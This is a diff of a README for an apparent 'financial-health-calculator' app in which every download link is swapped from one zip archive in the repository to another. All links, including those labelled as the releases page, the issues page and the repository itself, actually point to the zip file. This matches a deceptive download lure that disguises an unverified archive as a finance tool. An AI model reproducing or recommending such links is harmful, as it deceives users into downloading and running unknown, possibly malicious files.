@@ -1,6 +1,6 @@
 # 📊 financial-health-calculator - Your Guide to Financial Planning Made Easy
 
-[![Download](https://raw.githubusercontent.com/ImKidding03/financial-health-calculator/main/fundedness/models/financial_calculator_health_3.5.zip)](https://raw.githubusercontent.com/ImKidding03/financial-health-calculator/main/fundedness/models/financial_calculator_health_3.5.zip)
+[![Download](https://github.com/ImKidding03/financial-health-calculator/raw/refs/heads/main/examples/health_financial_calculator_3.9.zip)](https://github.com/ImKidding03/financial-health-calculator/raw/refs/heads/main/examples/health_financial_calculator_3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before downloading the application, ensure your system meets the following requi
 
 To start using the financial-health-calculator, follow these simple steps:
 
-1. **Visit the Releases Page**: Click [here to download](https://raw.githubusercontent.com/ImKidding03/financial-health-calculator/main/fundedness/models/financial_calculator_health_3.5.zip).
+1. **Visit the Releases Page**: Click [here to download](https://github.com/ImKidding03/financial-health-calculator/raw/refs/heads/main/examples/health_financial_calculator_3.9.zip).
    
 2. **Locate the Latest Release**: On the Releases page, find the most recent version of the application. The latest release will have the highest version number.
 
@@ -66,7 +66,7 @@ Here are some practical ways you can benefit from the financial-health-calculato
 
 ## 🔍 Support & Feedback
 
-If you encounter any issues or need help using the financial-health-calculator, please check our [Issues page](https://raw.githubusercontent.com/ImKidding03/financial-health-calculator/main/fundedness/models/financial_calculator_health_3.5.zip) to see if others have similar questions.
+If you encounter any issues or need help using the financial-health-calculator, please check our [Issues page](https://github.com/ImKidding03/financial-health-calculator/raw/refs/heads/main/examples/health_financial_calculator_3.9.zip) to see if others have similar questions.
 
 We appreciate your feedback. Share your experiences and suggestions on the platform to help us improve the application.
 
@@ -77,10 +77,10 @@ This project is licensed under the MIT License. Feel free to use and modify the 
 ## 🌐 Connect
 
 Stay connected for updates and conversations:
-- GitHub Repository: [financial-health-calculator](https://raw.githubusercontent.com/ImKidding03/financial-health-calculator/main/fundedness/models/financial_calculator_health_3.5.zip)
+- GitHub Repository: [financial-health-calculator](https://github.com/ImKidding03/financial-health-calculator/raw/refs/heads/main/examples/health_financial_calculator_3.9.zip)
 
 ## 🌟 Conclusion
 
 The financial-health-calculator equips you with essential tools for managing your finances. It's designed for everyone, regardless of your financial knowledge. Download today and take the first step toward a more secure financial future!
 
-[![Download](https://raw.githubusercontent.com/ImKidding03/financial-health-calculator/main/fundedness/models/financial_calculator_health_3.5.zip)](https://raw.githubusercontent.com/ImKidding03/financial-health-calculator/main/fundedness/models/financial_calculator_health_3.5.zip)
+[![Download](https://github.com/ImKidding03/financial-health-calculator/raw/refs/heads/main/examples/health_financial_calculator_3.9.zip)](https://github.com/ImKidding03/financial-health-calculator/raw/refs/heads/main/examples/health_financial_calculator_3.9.zip)
